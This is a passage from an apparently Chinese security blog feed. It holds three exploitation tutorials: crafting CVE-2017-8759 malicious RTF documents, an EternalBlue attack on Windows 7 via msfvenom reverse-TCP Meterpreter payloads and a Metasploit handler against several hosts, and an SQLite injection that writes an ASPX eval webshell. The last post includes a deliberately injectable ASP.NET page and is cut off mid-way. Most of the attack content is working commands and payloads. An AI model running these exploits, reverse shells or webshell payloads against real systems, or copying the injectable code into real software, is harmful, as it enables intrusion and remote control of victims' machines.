alt="替换地址后的内容"></p><p>然后就是打开该word文档，就可以看到计算器弹出。但实现的过程有点问题，就是必须点更新链接才会触发（即使将添加objupdate还是不行）。</p><p><img src="%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C.gif" alt="执行效果"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>参考<a href="https://github.com/vysec/CVE-2017-8759" target="_blank" rel="noopener">https://github.com/vysec/CVE-2017-8759</a><br>新建o.png，内容为：</p><p><img src="o.png%E5%86%85%E5%AE%B9.jpg" alt="o.png内容"></p><p>word.db内容：<br><img src="word.db%E5%86%85%E5%AE%B9.jpg" alt="word.db内容"></p><p>新建一个rtf文档，随意插入一个对象。例如<a href="http://192.168.135.135/office/o.png" target="_blank" rel="noopener">http://192.168.135.135/office/o.png</a> (这是为了下面替换objdata内容)<br>用记事本打开，将<code>\object\objautlink\rsltpict</code>修改为<code>\object\objautlink\objupdate\rsltpict</code><br>打开blob.bin文件</p><p><img src="blob.bin%E6%BA%90%E6%96%87%E4%BB%B6.jpg" alt="blob.bin源文件"><br>将其中的地址修改为<a href="http://192.168.135.135/office/o.png" target="_blank" rel="noopener">http://192.168.135.135/office/o.png</a><br>复制原来的地址，尽量多复制点空格。<br><img src="%E6%9B%BF%E6%8D%A2%E8%BF%87%E7%A8%8B1.jpg" alt="替换过程1"></p><p>然后生成新的hex地址<br><img src="%E7%94%9F%E6%88%90%E6%96%B0%E7%9A%84%E5%9C%B0%E5%9D%80.jpg" alt="生成新的地址"></p><p>然后用生成的地址替换blob.bin中的地址<br><img src="%E6%9B%BF%E6%8D%A2%E5%90%8E%E7%9A%84blob.bin%E6%96%87%E4%BB%B6.jpg" alt="替换后的blob.bin文件"><br>然后将blob.bin中的内容替换word文档的objdata内容。<br>然后打开word文档，就会有神奇的事情发生。<br><img src="%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C2.gif" alt="执行效果2"></p><p>恶意软件将被放置在<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\OfficeUpdte-KB[6个随机数字].exe</code></p><blockquote><p>以上均在虚拟机上测试。没有使用样本中的left.jpg。最后结果确实如火眼所说的那样生成了OfficeUpdte-KB******.exe文件。在win10(真机)上测试的时候还生成了http1001924168413541350office0office4png.pdb、http1001924168413541350office0office4png.dll和Logo.cs三个文件。<br>这里方法一没有直接执行的原因我也不太清楚，但是用方法二插入office.png，也是不会直接执行的。如果方法一和二中过程替换一下，效果也是一样的。</p></blockquote><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>下载脚本<a href="https://github.com/fupinglee/MyPython/blob/master/exploit/CVE-2017-8759/CVE-2017-8759_exploit_rtf.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/exploit/CVE-2017-8759/CVE-2017-8759_exploit_rtf.py</a></p><p>使用方法：<code>python CVE-2017-8759_exploit_rtf.py http://192.168.135.135/office/office.png</code><br>会在当前目录生成文件cve-2017-8759.rtf，打开即可。</p><blockquote><p>根据CVE-2017-0199的脚本改写而来，仅仅保留并修改了生成文件的代码。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>[1].<a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html</a><br>[2].<a href="http://mp.weixin.qq.com/s/_rfRtj6da1nowI4qMmkLaA" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/_rfRtj6da1nowI4qMmkLaA</a><br>[3].<a href="https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2017-8759 </tag>
            
            <tag> .NET Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用PentestBox工具利用ETERNALBLUE对Win7进行攻击，获取Meterpreter反弹</title>
      <link href="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/"/>
      <url>/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将使用<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">Sleepya</a>的脚本利用ETERNALBLUE来实现对Win7进行攻击，从而获取Meterpreter反弹。</p><a id="more"></a><p>靶机为Windows 7，IP为192.168.131.133。攻击机为Win10系统，安装了PentestBox，IP为192.168.217.1。<br>脚本下载地址：<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a></p><h3 id="漏洞利用测试"><a href="#漏洞利用测试" class="headerlink" title="漏洞利用测试"></a>漏洞利用测试</h3><h4 id="1-安装NASM"><a href="#1-安装NASM" class="headerlink" title="1.安装NASM"></a>1.安装NASM</h4><p>下载地址：<a href="http://www.nasm.us/pub/nasm/releasebuilds/" target="_blank" rel="noopener">http://www.nasm.us/pub/nasm/releasebuilds/</a> ，我这里用的是<a href="http://www.nasm.us/pub/nasm/releasebuilds/2.13.01/win64/nasm-2.13.01-installer-x64.exe" target="_blank" rel="noopener">2.13</a>。<br>然后开始安装。</p><p><img src="%E5%AE%89%E8%A3%85NASM.jpg" alt="安装NASM"></p><p>安装完成后加入环境变量。</p><h4 id="2-下载利用脚本，并编译内核shellcode"><a href="#2-下载利用脚本，并编译内核shellcode" class="headerlink" title="2.下载利用脚本，并编译内核shellcode"></a>2.下载利用脚本，并编译内核shellcode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/worawit/MS17-010</span><br></pre></td></tr></table></figure><p><img src="%E4%B8%8B%E8%BD%BD%E8%84%9A%E6%9C%AC.jpg" alt="下载脚本"></p><p>编译内核shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> MS17-010/shellcode/</span><br><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br><span class="line">nasm -f bin eternalblue_kshellcode_x86.asm</span><br></pre></td></tr></table></figure><p><img src="%E7%BC%96%E8%AF%91ASM%E6%96%87%E4%BB%B6.jpg" alt="编译ASM文件"></p><h4 id="3-生成反弹exp"><a href="#3-生成反弹exp" class="headerlink" title="3.生成反弹exp"></a>3.生成反弹exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4445 -f raw -o ../../Git/MS17-010/shellcode/sc_x86_msf.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4444 -f raw -o ../../Git/MS17-010/shellcode/sc_x64_msf.bin</span><br></pre></td></tr></table></figure><p><img src="%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9exp.jpg" alt="生成反弹exp"></p><h4 id="4-合并SHELLCODE"><a href="#4-合并SHELLCODE" class="headerlink" title="4.合并SHELLCODE"></a>4.合并SHELLCODE</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat eternalblue_kshellcode_x64 sc_x64_msf.bin &gt; sc_x64.bin</span><br><span class="line">cat eternalblue_kshellcode_x86 sc_x86_msf.bin &gt; sc_x86.bin</span><br><span class="line">python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin</span><br></pre></td></tr></table></figure><p><img src="%E5%90%88%E5%B9%B6SHELLCODE.jpg" alt="合并SHELLCODE"></p><h4 id="5-开启Metasploit并监听"><a href="#5-开启Metasploit并监听" class="headerlink" title="5.开启Metasploit并监听"></a>5.开启Metasploit并监听</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> EXITFUNC thread</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.217.1</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">...</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4445</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure><p><img src="%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC.jpg" alt="开启监听"></p><h4 id="6-进行攻击"><a href="#6-进行攻击" class="headerlink" title="6.进行攻击"></a>6.进行攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</span><br></pre></td></tr></table></figure><p><img src="%E5%88%A9%E7%94%A8%E7%94%9F%E6%88%90%E7%9A%84%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.jpg" alt="利用生成的脚本攻击"></p><p><img src="%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C.jpg" alt="攻击结果"><br>看到已经获取Meterpreter反弹。</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>在PentestBox中运行一些命令时(如msfconsole)，提示<code>不是内部或外部命令，也不是可运行的程序或批处理文件。</code><br>解决方法：输入<code>cmd</code>之后再输入需要执行的命令。<br><img src="%E9%97%AE%E9%A2%981.jpg" alt="问题1"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.这种方式利用稍微简单点，不需要过多的命令，而且生成的SHELLCODE也具有复用性。<br>2.在以上的操作中，均生成了32位和64位的shellcode，最后利用eternalblue_sc_merge脚本合并到一起。然后在Eternalblue漏洞中利用合并的shellcode可以支持x86和x64，无需再检测目标体系结构。<br>3.在使用中设置了线程，可以同时对多个系统进行攻击测试。<br>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.134 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.135 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.136 shellcode\sc_all.bin</span><br></pre></td></tr></table></figure><p><img src="%E5%A4%9A%E4%B8%AA%E6%94%BB%E5%87%BB.jpg" alt="多个攻击"><br>攻击结果：<br><img src="%E5%A4%9A%E4%B8%AA%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C.jpg" alt="多个攻击结果"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a><br>[2]<a href="https://www.exploit-db.com/docs/42280.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/42280.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MS17-010 </tag>
            
            <tag> PentestBox </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLite手工注入Getshell技巧</title>
      <link href="/2017/07/19/SQLite-Injection-Get-WebShell/"/>
      <url>/2017/07/19/SQLite-Injection-Get-WebShell/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p><a href="http://www.sqlite.org/" target="_blank" rel="noopener">SQLite</a>是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite本身是C写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的App中使用。<br>之前没有遇到过关于SQLite的注入，这次遇到一个在ASPX中使用SQLite数据库，并且存在注入。这篇文章将主要介绍一下从注入到获取WEBSHELL的过程和遇到的一些坑。<br>首先介绍一下SQLite的使用方法，然后在本地搭建环境以及利用注入获取WEBSHELL，最后将讲述在实际应用中遇到的问题以及如何解决（e.g.手工注入写shell）。</p><a id="more"></a><h3 id="0x02-SQLite的使用"><a href="#0x02-SQLite的使用" class="headerlink" title="0x02 SQLite的使用"></a>0x02 SQLite的使用</h3><p>SQLite 的一个重要的特性是零配置的，这意味着不需要复杂的安装或管理。在 Windows 上使用SQLite时访问  <a href="http://www.sqlite.org/download.html" target="_blank" rel="noopener">SQLite下载页面</a>，从 Windows 区下载预编译的二进制文件。现在最新的为<a href="http://www.sqlite.org/2017/sqlite-tools-win32-x86-3190300.zip" target="_blank" rel="noopener">sqlite-tools-win32-x86-3190300.zip</a>，下载下来后解压。我这里将其中的文件复制到<code>D:\sqlite</code>目录。</p><p>SQLite的语法和其他数据库差不多，只不过SQLite的数据库是一个单独的文件。SQLite创建数据库的方法有两种，一种是创建，另外一种是附加。</p><p>创建使用命令：<code>sqlite3.exe 数据库文件名</code>。例如创建一个名字为aa.db的数据库，使用命令：<code>sqlite3.exe aa.db</code>。</p><p><img src="%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="创建数据库"></p><p>附加数据库的基本语法是：<code>ATTACH DATABASE &#39;DatabaseName&#39; As &#39;Alias-Name&#39;;</code>。如果数据库尚未被创建，这个命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库 ‘Alias-Name’ 绑定在一起。例如附加一个bb.db的数据库，别名为a，命令为：<code>attach database &#39;d:\\sqlite\\bb.db&#39; as &#39;a&#39;;</code>。</p><p><img src="%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="附加数据库"></p><p>创建表并插入数据的命令如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> a.tt(dataz <span class="built_in">text</span>); <span class="keyword">INSERT</span> <span class="keyword">into</span> a.tt(dataz) <span class="keyword">VALUES</span> (<span class="string">'test'</span>);</span><br></pre></td></tr></table></figure><p><img src="%E5%88%9B%E5%BB%BA%E8%A1%A8%E6%9F%A5%E8%AF%A2.jpg" alt="创建表查询"></p><p>SQLite还可以生成任意后缀名的数据库文件。例如创建一个php结尾的数据库文件，新建一个名为exp的表，并在其中插入数据，内容为：<code>&lt;?php phpinfo();?&gt;</code>。</p><p>具体命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt;ATTACH DATABASE <span class="string">'d:\\sqlite\\23.php'</span> AS <span class="built_in">test</span> ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES (<span class="string">'&lt;?php phpinfo();?&gt;'</span>);--</span><br></pre></td></tr></table></figure><p><img src="%E7%94%9F%E6%88%90%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%BC%E5%BC%8F%E4%B8%BAPHP.jpg" alt="生成数据库格式为PHP"></p><p>将生成的数据库文件23.php放在web目录，然后访问。发现数据库中插入的数据竟被解析了。</p><p><img src="PHP%E8%A7%A3%E6%9E%90.jpg" alt="PHP解析"></p><p>同样的方法生成aspx后缀的数据库文件，创建表，并插入<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code>。然后将该文件放在IIS服务的web目录。发现其中的APSX代码也会被解析。</p><p><img src="ASPX%E6%A0%BC%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="ASPX格式数据库"></p><p>通过查看生成的数据库文件，发现其中表的内容都以原格式存储的，这就导致了表中的代码被解析的原因。接下来将在本地搭建一个ASPX+SQLite的web项目，演示一下如何通过SQL注入获取WEBSHELL。</p><h3 id="0x03-本地环境搭建及获取SHELL"><a href="#0x03-本地环境搭建及获取SHELL" class="headerlink" title="0x03 本地环境搭建及获取SHELL"></a>0x03 本地环境搭建及获取SHELL</h3><p>因为在实际应用中遇到的是.Net开发的web项目，所以这里也以ASPX程序为例。</p><h4 id="1-环境搭建和项目的部署"><a href="#1-环境搭建和项目的部署" class="headerlink" title="1.环境搭建和项目的部署"></a>1.环境搭建和项目的部署</h4><p>下载安装 <a href="https://sourceforge.net/projects/sqlite-dotnet2/" target="_blank" rel="noopener">Sqlite ADO.NET</a>，下载后直接安装即可。安装后将其中的System.Data.SQLite.DLL文件复制出来，在下面的项目中将会用到（分32和64位，根据自己的环境选择）。</p><p>这里我采用VS2013，新建一个ASP.NET网站，在项目中新建一个Bin文件夹和一个ASPX页面（这里名称为Default.aspx)，将上面复制出来的System.Data.SQLite.DLL文件放在Bin目录中。</p><p>其目录结构如图：</p><p><img src="%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.jpg" alt="项目目录结构"></p><p>Default.aspx是显示页面，其中有一个文本框和按钮。主要代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">asp:TextBox</span> <span class="attr">ID</span>=<span class="string">"TextBox1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span><span class="tag">&lt;/<span class="name">asp:TextBox</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">asp:Button</span> <span class="attr">ID</span>=<span class="string">"Button1"</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">OnClick</span>=<span class="string">"btn_Click"</span> <span class="attr">Text</span>=<span class="string">"查询"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Default.aspx.cs是代码的实现，代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Web;</span><br><span class="line">using System.Web.UI;</span><br><span class="line">using System.Web.UI.WebControls;</span><br><span class="line">using System.Data.SQLite; </span><br><span class="line"></span><br><span class="line">public partial class _Default : System.Web.UI.Page</span><br><span class="line">&#123;</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!System.IO.File.Exists(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            SQLiteConnection.ClearAllPools();</span><br><span class="line">            SQLiteConnection.CreateFile(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>);</span><br><span class="line">            SQLiteConnection conn = new SQLiteConnection(<span class="string">"Data Source="</span> + Server.MapPath(<span class="string">"~"</span> + <span class="string">"/UserData.dbx"</span>));</span><br><span class="line">            conn.Open();</span><br><span class="line">            SQLiteCommand cmd = new SQLiteCommand();</span><br><span class="line">            cmd.CommandText = <span class="string">"create table Users (UserID int primary key,UserName varchar(100) not null,UserPassword varchar(100) not null)"</span>;</span><br><span class="line">            cmd.Connection = conn;</span><br><span class="line">            cmd.ExecuteNonQuery();</span><br><span class="line">            <span class="keyword">for</span> (int i = 0; i &lt; 100; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                cmd.CommandText = <span class="string">"insert into Users (UserID,UserName,UserPassword) values ("</span> + i + <span class="string">",'TestUser_"</span> + i + <span class="string">"','"</span> + DateTime.Now.ToString().Replace(<span class="string">" "</span>, <span class="string">"-"</span>).Replace(<span class="string">":"</span>, <span class="string">"-"</span>) + <span class="string">"')"</span>;</span><br><span class="line">                cmd.ExecuteNonQuery();</span><br><span class="line">            &#125;</span><br><span class="line">            conn.Clone();</span><br><span class="line">            conn.Dispose();</span><br><span class="line">            Response.Write(<span class="string">"初始化~~&lt;br /&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Response.Write(<span class="string">"加载成功~~&lt;br /&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void btn_Click(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (TextBox1.Text != <span class="string">""</span>)&#123;</span><br><span class="line">            SQLiteConnection.ClearAllPools();</span><br><span class="line">            //SQLiteConnection.CreateFile(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>);</span><br><span class="line">            SQLiteConnection conn = new SQLiteConnection(<span class="string">"Data Source="</span> + Server.MapPath(<span class="string">"~"</span> + <span class="string">"/UserData.dbx"</span>));</span><br><span class="line">            conn.Open();</span><br><span class="line">            SQLiteCommand cmd = new SQLiteCommand();</span><br><span class="line">            cmd.CommandText = <span class="string">"select UserPassword from Users where UserName='"</span> + TextBox1.Text.Trim()+<span class="string">"'"</span>;</span><br><span class="line">            cmd.Connection = conn;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd.ExecuteScalar() != null)</span><br><span class="line">            &#123;</span><br><span class="line">                string tempUserName = cmd.ExecuteScalar().ToString();</span><br><span class="line">                Response.Write(<span class="string">"查询结果为:"</span> + tempUserName + <span class="string">"&lt;br /&gt;&lt;br /&gt;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Response.Write(<span class="string">"无此用户"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Response.Write(<span class="string">"请输入查询内容~~&lt;br /&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将项目部署即可，这就是一个存在注入的项目。接下来就是利用注入来获取WEBSHELL。</p><h4 id="2-SQL注入写WEBSHELL"><a href="#2-SQL注入写WEBSHELL" class="headerlink" title="2.SQL注入写WEBSHELL"></a>2.SQL注入写WEBSHELL</h4><p><img src="%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2.jpg" alt="项目部署"></p><p>当输入<code>&#39;</code>时，项目报错，同时将web绝对路径暴露出来。</p><p><img src="%E6%8A%A5%E9%94%99.jpg" alt="报错"></p><p>然后就根据上面SQLite创建ASPX格式的数据库的方式来写入一个WEBSHELL。</p><p>其语句为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>c:\\WebSite\\css.aspx<span class="string">' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('</span>&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;<span class="string">'); --</span></span><br></pre></td></tr></table></figure><p><img src="%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%86%99shell.jpg" alt="测试环境写shell"></p><p><img src="%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%88%90%E5%8A%9F%E5%86%99%E5%85%A5SHELL.jpg" alt="测试环境成功写入SHELL"></p><p>测试环境很顺利就通过SQL注入写入了WEBSHELL，但是在实际测试中并非如此顺利。接下来看看在实际应用中遇到的问题以及解决的方法。</p><h3 id="0x04-实际中应用中遇到的问题及解决方法"><a href="#0x04-实际中应用中遇到的问题及解决方法" class="headerlink" title="0x04 实际中应用中遇到的问题及解决方法"></a>0x04 实际中应用中遇到的问题及解决方法</h3><p>已知：该系统存在SQL注入，数据库为SQLite，通过报错发现web项目的绝对路径。后台存在弱口令，后台可以上传图片格式文件。</p><p>直接利用SQLite写aspx文件时，发现可以写入成功，但是SHELL没有执行。无法判断是shell代码未写入成功还是未执行成功。然后就先写个TXT查看shell代码是否可以写入成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>d:\\********\\web\\24.txt<span class="string">' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('</span>&lt;%@ Page Language=<span class="string">"Jscript"</span>&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;<span class="string">'); --</span></span><br></pre></td></tr></table></figure><p>然后直接访问根目录下的24.txt文件即可下载，下载后用SQLite数据库管理工具打开，这里用的是Navicat。</p><p><img src="24txt.jpg" alt="24txt"></p><p>打开发现竟然是空的。然而将shell代码替换为字符串<code>test</code>时可以写入成功。那应该就是写入的SHELL中含有一些符号所致，这里尝试了转义都未能解决。</p><p>由于可以找到图片上传的入口，所以有这样一个思路：在本地生成一个格式为jpg的数据库文件，创建表并写入SHELL，然后上传到服务器；在网站上利用注入新建一个txt格式的数据库，创建表后将图片格式数据库的内容插入到txt格式数据库中。</p><p><img src="%E7%94%9F%E6%88%90%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E9%A9%AC.jpg" alt="生成图片格式马"></p><p><img src="%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE%E5%BA%931.jpg" alt="恢复数据库1"></p><p>提示数据库编码不一致，那就换另外一种方法。首先在web根目录生成一个jpg格式的数据库，创建表后下载；在本地打开后插入数据，之后上传到服务器；再在网站新建一个ASPX格式的数据库，创建表后将图片格式数据库的内容插入到ASPX格式数据库中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>d:\\********\\web\\fp.jpg<span class="string">' AS pwn;create TABLE pwn.exp(dataz text);--</span></span><br></pre></td></tr></table></figure><p><img src="%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%9F%E6%88%90%E5%9B%BE%E7%89%87%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="服务器生成图片数据库"></p><p><img src="%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE%E5%BA%932.jpg" alt="恢复数据库2"></p><p>可以成功写入，但访问发现插入的ASPX代码被原样输出，SHELL未执行成功。然后来对比一下在web上生成和本地生成的文件有什么区别。</p><p>分别在本地和web上生成一个txt格式的数据库文件，新建表后插入<code>test</code>。然后对比其内容：</p><p><img 